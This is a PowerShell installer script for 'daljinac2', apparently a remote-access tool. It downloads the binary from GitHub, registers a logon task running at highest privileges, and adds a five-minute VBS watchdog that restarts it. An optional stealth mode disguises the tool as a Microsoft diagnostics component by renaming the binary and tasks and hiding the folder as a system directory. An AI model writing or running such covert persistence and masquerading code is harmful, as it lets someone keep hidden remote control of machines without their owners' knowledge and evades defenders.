param([switch]$notray, [switch]$stealth)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"
$VerbosePreference = "Continue"

if ($stealth) {
    $Dir      = "C:\ProgramData\Microsoft\DiagHub"
    $ExeName  = "DiagHubHost.exe"
    $TaskName = "MicrosoftDiagHubCollect"
    $WatchName = "MicrosoftDiagHubWatch"
    $ExtraArgs = "-stealth"
} else {
    $Dir      = "C:\daljinac2"
    $ExeName  = "daljinac2.exe"
    $TaskName = "Daljinac2"
    $WatchName = "Daljinac2Watch"
    $ExtraArgs = if ($notray) { "-notray" } else { "" }
}

$Exe = "$Dir\$ExeName"
$URL = "https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe"

try {
    # Kill any running instance FIRST
    Write-Host "[0/3] Killing old processes..."
    Get-Process daljinac2,DiagHubHost -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 2

    # Make sure the dir exists
    mkdir $Dir -Force | Out-Null

    Write-Host "[1/3] Downloading..."
    Invoke-WebRequest $URL -OutFile "$Exe.new" -UseBasicParsing
    Write-Host "       $((Get-Item "$Exe.new").Length) bytes"

    # Wait for file locks to release
    Start-Sleep -Seconds 1

    Write-Host "[1b/3] Replacing old binary..."
    Get-Process daljinac2,DiagHubHost -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 1
    Move-Item -Force "$Exe.new" $Exe

    Write-Host "[2/3] Installing scheduled task..."
    Remove-Item "$Dir\watchdog.vbs" -Force -ErrorAction SilentlyContinue

    # Clean ALL task variants
    @("Daljinac2","Daljinac2Watch","MicrosoftDiagHubCollect","MicrosoftDiagHubWatch") | ForEach-Object {
        try { schtasks /delete /tn $_ /f 2>$null } catch {}
    }

    Write-Host "       Creating $TaskName ONLOGON task..."
    $taskCmd = if ($ExtraArgs) { "`"$Exe`" $ExtraArgs" } else { "`"$Exe`"" }
    schtasks /create /tn $TaskName /tr $taskCmd /sc ONLOGON /it /rl HIGHEST /f
    if ($LASTEXITCODE -ne 0) { throw "schtasks $TaskName failed (exit=$LASTEXITCODE)" }

    Write-Host "       Creating $WatchName (5min watchdog)..."
    $vbsContent = "CreateObject(`"WScript.Shell`").Run `"schtasks /run /tn $TaskName`", 0, False"
    Set-Content -Path "$Dir\watchdog.vbs" -Value $vbsContent -Encoding ASCII
    schtasks /create /tn $WatchName /tr "wscript.exe //B $Dir\watchdog.vbs" /sc MINUTE /mo 5 /f
    if ($LASTEXITCODE -ne 0) { throw "schtasks $WatchName failed (exit=$LASTEXITCODE)" }

    # Remove old Run registry key to prevent double-start
    try {
        $reg = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", $true)
        if ($reg) {
            $reg.DeleteValue("Daljinac2")
            $reg.Close()
            Write-Host "       Old Run registry key removed (cleanup)"
        }
    } catch {
        Write-Host "       (Run registry key cleanup: $($_.Exception.Message))"
    }

    if ($stealth) {
        attrib +h +s $Dir
        Write-Host "       Stealth folder hidden (+h +s)"
    }

    Write-Host "[3/3] Starting..."
    $cmd = if ($ExtraArgs) { "`"$Exe`" $ExtraArgs" } else { "`"$Exe`"" }
    ([wmiclass]'Win32_Process').Create($cmd) | Out-Null

    Write-Host ""
    Write-Host "DONE." -ForegroundColor Green
    if ($stealth) { Write-Host "  Mode: STEALTH (hidden folder, renamed binary, stealth task names)" }
    elseif ($notray) { Write-Host "  Mode: no-tray (background)" }
} catch {
    Write-Host ""
    Write-Host "ERROR: $_" -ForegroundColor Red
    exit 1
}
